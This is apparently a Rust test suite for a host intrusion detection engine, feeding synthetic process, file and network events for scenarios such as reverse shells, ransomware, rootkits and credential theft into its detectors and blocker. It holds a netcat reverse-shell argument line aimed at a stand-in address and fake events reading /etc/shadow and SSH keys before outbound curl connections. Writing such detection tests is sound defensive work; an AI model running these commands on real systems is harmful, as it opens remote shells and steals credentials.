use ks_core::event::EventHeader;
use ks_engine::aggregator::DecodedEvent;
use ks_engine::baseline::BaselineManager;
use ks_engine::blocker::{BlockManager, BlockReason};
use ks_engine::correlation::CorrelationEngine;
use ks_engine::detector::DetectionEngine;
use ks_engine::ml_detector::AdaptiveDetector;
use ks_engine::process_tree::ProcessTreeManager;

fn make_event(pid: u32, ppid: u32, comm: &str, event_type: u32, timestamp_ns: u64) -> DecodedEvent {
    DecodedEvent {
        seq: 0,
        header: EventHeader {
            event_type,
            _pad1: 0,
            timestamp_ns,
            pid,
            tid: pid,
            uid: 0,
            ppid,
            comm: {
                let mut c = [0u8; 16];
                let b = comm.as_bytes();
                let n = b.len().min(15);
                c[..n].copy_from_slice(&b[..n]);
                c
            },
            syscall_nr: 0,
            _pad2: 0,
            retval: 0,
        },
        comm: comm.to_string(),
        filename: None,
        args: None,
        saddr: None,
        daddr: None,
        sport: None,
        dport: None,
        proto: None,
        target_pid: None,
        signal: None,
        file_bytes: None,
        module_name: None,
        prog_name: None,
        source_ns_inum: None,
        target_ns_inum: None,
        cap_eff: None,
        action: None,
    }
}

fn make_exec(pid: u32, ppid: u32, comm: &str, fname: &str, args: &str, ts: u64) -> DecodedEvent {
    let mut e = make_event(pid, ppid, comm, 1, ts);
    e.filename = Some(fname.to_string());
    e.args = Some(args.to_string());
    e
}

fn make_file(
    pid: u32,
    ppid: u32,
    comm: &str,
    fname: &str,
    event_type: u32,
    ts: u64,
) -> DecodedEvent {
    let mut e = make_event(pid, ppid, comm, event_type, ts);
    e.filename = Some(fname.to_string());
    e
}

fn make_net(pid: u32, ppid: u32, comm: &str, daddr: &str, dport: u16, ts: u64) -> DecodedEvent {
    let mut e = make_event(pid, ppid, comm, 20, ts);
    e.daddr = Some(daddr.to_string());
    e.dport = Some(dport);
    e.proto = Some("TCP".to_string());
    e
}

fn load_all_rules(detector: &mut DetectionEngine) {
    let manifest_dir = env!("CARGO_MANIFEST_DIR");
    let rules_dir = std::path::Path::new(manifest_dir).join("../../rules");
    if rules_dir.exists() {
        load_rules_from_dir(detector, &rules_dir);
    } else {
        let alt = std::path::Path::new(manifest_dir).join("../rules");
        if alt.exists() {
            load_rules_from_dir(detector, &alt);
        }
    }
}

fn load_rules_from_dir(detector: &mut DetectionEngine, dir: &std::path::Path) {
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|s| s.to_str()) == Some("yml") {
                if let Ok(content) = std::fs::read_to_string(&path) {
                    let _ = detector.load_rules_from_yaml(&content);
                }
            }
        }
    }
}

#[test]
fn test_e2e_reverse_shell() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut baseline = BaselineManager::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let sshd = make_exec(1000, 1, "sshd", "/usr/sbin/sshd", "-D", ts);
    let bash = make_exec(1001, 1000, "bash", "/bin/bash", "-i", ts + 1000);
    let nc = make_exec(
        1002,
        1001,
        "nc",
        "/usr/bin/nc",
        "-e /bin/bash 1.2.3.4 4444",
        ts + 2000,
    );
    let conn = make_net(1002, 1001, "nc", "1.2.3.4", 4444, ts + 3000);

    for e in [&sshd, &bash, &nc, &conn] {
        baseline.update_from_event(e);
        tree.update_from_event(e);
        corr.detect_correlations_with_tree(e, Some(&tree));
        ml.update_from_event(e);
    }

    let matches = detector.match_event(&bash);
    let nc_matches = detector.match_event(&nc);
    let _net_matches = detector.match_event(&conn);
    assert!(
        !matches.is_empty() || !nc_matches.is_empty(),
        "bash -i或nc -e应触发反弹Shell规则"
    );

    block.block_pid(1002, 300, BlockReason::RuleMatch, "reverse_shell");
    assert!(block.is_blocked(1002));
}

#[test]
fn test_e2e_ransomware() {
    let mut baseline = BaselineManager::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    for i in 0..600u32 {
        let fname = format!("/home/user/docs/file_{}.encrypted", i);
        let e = make_file(2000, 1, "encryptor", &fname, 12, ts + i as u64 * 1_000_000);
        baseline.update_from_event(&e);
        ml.update_from_event(&e);
        corr.detect_correlations_with_tree(&e, Some(&tree));
        tree.update_from_event(&e);
    }

    let dev = baseline.detect_deviation(2000);
    assert!(dev.is_some(), "勒索软件应触发基线偏离");
    if let Some(d) = dev {
        assert!(
            d.overall_score >= 1.0,
            "偏离度应 >= 1.0 (实际: {})",
            d.overall_score
        );
    }

    let ml_result = ml.detect(2000);
    assert!(ml_result.is_some(), "ML应检测到勒索软件频率突增");

    block.block_pid(2000, 600, BlockReason::MlAnomaly, "ransomware");
    assert!(block.is_blocked(2000));
}

#[test]
fn test_e2e_privilege_escalation() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut baseline = BaselineManager::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut ml = AdaptiveDetector::new();

    let ts = 1_625_340_000_000_000;
    let chmod = make_file(3000, 1, "bash", "/bin/bash", 15, ts);
    let sudoers = make_file(3000, 1, "bash", "/etc/sudoers", 12, ts + 1000);

    for e in [&chmod, &sudoers] {
        baseline.update_from_event(e);
        ml.update_from_event(e);
        corr.detect_correlations_with_tree(e, Some(&tree));
        tree.update_from_event(e);
    }

    let matches = detector.match_event(&sudoers);
    assert!(!matches.is_empty(), "访问 /etc/sudoers应触发规则");

    let _dev = baseline.detect_deviation(3000);
}

#[test]
fn test_e2e_dns_tunnel() {
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();

    let ts = 1_625_340_000_000_000;
    for i in 0..250u32 {
        let daddr = format!("8.8.8.{}", i % 256);
        let e = make_net(4000, 1, "dig", &daddr, 53, ts + i as u64 * 100_000);
        baseline.update_from_event(&e);
        ml.update_from_event(&e);
        corr.detect_correlations_with_tree(&e, Some(&tree));
        tree.update_from_event(&e);
    }

    let dev = baseline.detect_deviation(4000);
    assert!(dev.is_some(), "DNS隧道应触发基线偏离");

    let ml_result = ml.detect(4000);
    assert!(ml_result.is_some(), "ML应检测到DNS隧道频率异常");
}

#[test]
fn test_e2e_rootkit() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut ml = AdaptiveDetector::new();

    let ts = 1_625_340_000_000_000;
    let insmod = make_exec(5000, 1, "insmod", "/sbin/insmod", "rootkit.ko", ts);
    let proc_access = make_file(5000, 1, "bash", "/proc/kallsyms", 11, ts + 1000);

    for e in [&insmod, &proc_access] {
        ml.update_from_event(e);
        corr.detect_correlations_with_tree(e, Some(&tree));
        tree.update_from_event(e);
    }

    let matches = detector.match_event(&insmod);
    let proc_matches = detector.match_event(&proc_access);
    assert!(
        !matches.is_empty() || !proc_matches.is_empty() || ml.detect(5000).is_some(),
        "Rootkit场景应触发至少一个检测维度"
    );
}

#[test]
fn test_e2e_data_exfil() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let shadow = make_file(6000, 1, "cat", "/etc/shadow", 11, ts);
    let exfil = make_net(6000, 1, "curl", "203.0.113.10", 4444, ts + 5000);

    baseline.update_from_event(&shadow);
    ml.update_from_event(&shadow);
    corr.detect_correlations_with_tree(&shadow, Some(&tree));
    tree.update_from_event(&shadow);

    for i in 0..105u32 {
        let e = make_net(
            6000,
            1,
            "curl",
            "203.0.113.10",
            4444,
            ts + 5000 + i as u64 * 1000,
        );
        baseline.update_from_event(&e);
        ml.update_from_event(&e);
        corr.detect_correlations_with_tree(&e, Some(&tree));
        tree.update_from_event(&e);
    }

    let matches = detector.match_event(&shadow);
    assert!(!matches.is_empty(), "/etc/shadow应触发敏感文件规则");

    let net_matches = detector.match_event(&exfil);
    let dev = baseline.detect_deviation(6000);
    let ml_result = ml.detect(6000);
    assert!(
        !net_matches.is_empty() || dev.is_some() || ml_result.is_some(),
        "数据窃取外连应触发至少一个检测维度(规则/baseline/ML)"
    );

    block.block_pid(6000, 300, BlockReason::Correlation, "data_exfil");
    assert!(block.is_blocked(6000));
}

#[test]
fn test_e2e_container_escape() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let mut e = make_event(7000, 1, "runc", 80, ts);
    e.cap_eff = Some(0x1FF);
    e.action = Some("escape".to_string());

    baseline.update_from_event(&e);
    ml.update_from_event(&e);

    let matches = detector.match_event(&e);
    assert!(
        !matches.is_empty() || ml.detect(7000).is_some(),
        "容器逃逸应触发检测"
    );

    block.block_pid(7000, 0, BlockReason::RuleMatch, "container_escape");
    assert!(block.is_blocked(7000));
}

#[test]
fn test_e2e_lkm_load() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let mut e = make_event(8000, 1, "insmod", 81, ts);
    e.module_name = Some("malicious.ko".to_string());

    ml.update_from_event(&e);

    let matches = detector.match_event(&e);
    assert!(
        !matches.is_empty() || ml.detect(8000).is_some(),
        "LKM加载应触发检测"
    );

    block.block_pid(8000, 0, BlockReason::RuleMatch, "lkm_load");
    assert!(block.is_blocked(8000));
}

#[test]
fn test_e2e_ebpf_tamper() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let mut e = make_event(9000, 1, "bpftool", 82, ts);
    e.prog_name = Some("malicious_prog".to_string());
    e.action = Some("unload".to_string());

    ml.update_from_event(&e);

    let matches = detector.match_event(&e);
    assert!(
        !matches.is_empty() || ml.detect(9000).is_some(),
        "eBPF篡改应触发检测"
    );

    block.block_pid(9000, 0, BlockReason::RuleMatch, "ebpf_tamper");
    assert!(block.is_blocked(9000));
}

#[test]
fn test_e2e_ssh_key_steal() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let ssh_key = make_file(10000, 1, "cat", "/home/user/.ssh/id_rsa", 11, ts);
    let exfil = make_net(10000, 1, "curl", "203.0.113.20", 4444, ts + 3000);

    baseline.update_from_event(&ssh_key);
    ml.update_from_event(&ssh_key);
    corr.detect_correlations_with_tree(&ssh_key, Some(&tree));
    tree.update_from_event(&ssh_key);

    for i in 0..105u32 {
        let e = make_net(
            10000,
            1,
            "curl",
            "203.0.113.20",
            4444,
            ts + 3000 + i as u64 * 1000,
        );
        baseline.update_from_event(&e);
        ml.update_from_event(&e);
        corr.detect_correlations_with_tree(&e, Some(&tree));
        tree.update_from_event(&e);
    }

    let matches = detector.match_event(&ssh_key);
    let net_matches = detector.match_event(&exfil);
    let dev = baseline.detect_deviation(10000);
    let ml_result = ml.detect(10000);
    assert!(
        !matches.is_empty() || !net_matches.is_empty() || dev.is_some() || ml_result.is_some(),
        "SSH密钥窃取应触发至少一个检测维度(规则/baseline/ML)"
    );

    block.block_pid(10000, 300, BlockReason::Correlation, "ssh_key_steal");
    assert!(block.is_blocked(10000));
}

#[test]
fn test_e2e_lateral_movement() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();
    let mut block = BlockManager::new();
    block.set_enabled(true);

    let ts = 1_625_340_000_000_000;
    let mut ptrace = make_event(11000, 1, "ptrace_tool", 30, ts);
    ptrace.target_pid = Some(11001);
    ptrace.signal = Some(0);
    ptrace.header.syscall_nr = 101;
    let mut kill = make_event(11000, 1, "ptrace_tool", 31, ts + 1000);
    kill.target_pid = Some(11001);
    kill.signal = Some(9);

    let extra_ptrace1 = make_event(11000, 1, "ptrace_tool", 30, ts + 2000);
    let extra_ptrace2 = make_event(11000, 1, "ptrace_tool", 30, ts + 3000);
    let extra_ptrace3 = make_event(11000, 1, "ptrace_tool", 30, ts + 4000);

    for e in [
        &ptrace,
        &kill,
        &extra_ptrace1,
        &extra_ptrace2,
        &extra_ptrace3,
    ] {
        baseline.update_from_event(e);
        ml.update_from_event(e);
        corr.detect_correlations_with_tree(e, Some(&tree));
        tree.update_from_event(e);
    }

    let matches = detector.match_event(&ptrace);
    assert!(
        !matches.is_empty() || ml.detect(11000).is_some(),
        "横向移动应触发检测"
    );

    block.block_pid(11000, 600, BlockReason::RuleMatch, "lateral_movement");
    assert!(block.is_blocked(11000));
}

#[test]
fn test_e2e_normal_baseline_no_false_positive() {
    let mut detector = DetectionEngine::new();
    load_all_rules(&mut detector);
    let mut baseline = BaselineManager::new();
    let mut ml = AdaptiveDetector::new();
    let mut corr = CorrelationEngine::new(300);
    let mut tree = ProcessTreeManager::new();

    let ts = 1_625_340_000_000_000;
    let events = vec![
        make_exec(12000, 1, "bash", "/bin/ls", "-la /tmp", ts),
        make_exec(12001, 1, "bash", "/bin/cat", "/etc/hostname", ts + 1000),
        make_exec(
            12002,
            1,
            "bash",
            "/usr/bin/wget",
            "http://example.com/file",
            ts + 2000,
        ),
        make_file(12002, 1, "wget", "/tmp/file", 12, ts + 3000),
    ];

    for e in &events {
        baseline.update_from_event(e);
        ml.update_from_event(e);
        corr.detect_correlations_with_tree(e, Some(&tree));
        tree.update_from_event(e);
    }

    for e in &events {
        let matches = detector.match_event(e);
        for m in &matches {
            assert!(
                !matches!(
                    m.severity,
                    ks_core::rule::Severity::Critical | ks_core::rule::Severity::High
                ),
                "正常操作不应触发critical/high告警(规则: {})",
                m.rule_name
            );
        }
    }

    let dev = baseline.detect_deviation(12000);
    if let Some(d) = dev {
        assert!(
            d.overall_score < 3.0,
            "正常操作偏离度应较低(实际: {})",
            d.overall_score
        );
    }

    let ml_result = ml.detect(12000);
    if let Some(r) = ml_result {
        assert!(
            r.overall_score < 0.9,
            "正常操作不应触发高分ML异常(实际: {})",
            r.overall_score
        );
    }
}

#[test]
fn test_e2e_block_lifecycle() {
    let mut block = BlockManager::new();
    block.set_enabled(true);

    assert!(block.block_pid(13000, 100, BlockReason::RuleMatch, "test_rule"));
    assert!(block.is_blocked(13000));

    assert!(block.unblock_pid(13000));
    assert!(!block.is_blocked(13000));

    assert!(block.block_pid(13001, 0, BlockReason::Manual, "manual"));
    assert!(block.is_blocked(13001));

    let list = block.list_blocked();
    assert_eq!(list.len(), 1);
    assert_eq!(list[0].pid, 13001);
    assert_eq!(list[0].reason, BlockReason::Manual);
}

#[test]
fn test_e2e_false_feedback_threshold_adjustment() {
    let mut ml = AdaptiveDetector::new();
    let ts = 1_625_340_000_000_000;

    for i in 0..200u32 {
        let e = make_net(
            14000,
            1,
            "wget",
            "93.184.216.34",
            80,
            ts + i as u64 * 100_000,
        );
        ml.update_from_event(&e);
    }
    let first_detection = ml.detect(14000);

    ml.false_feedback(14000, true);

    for i in 0..200u32 {
        let e = make_net(
            14000,
            1,
            "wget",
            "93.184.216.34",
            80,
            ts + 1_000_000_000 + i as u64 * 100_000,
        );
        ml.update_from_event(&e);
    }
    let after_feedback = ml.detect(14000);
    if let (Some(before), Some(after)) = (first_detection, after_feedback) {
        assert!(
            after.overall_score <= before.overall_score,
            "误报反馈后overall_score应不增加"
        );
    }
}
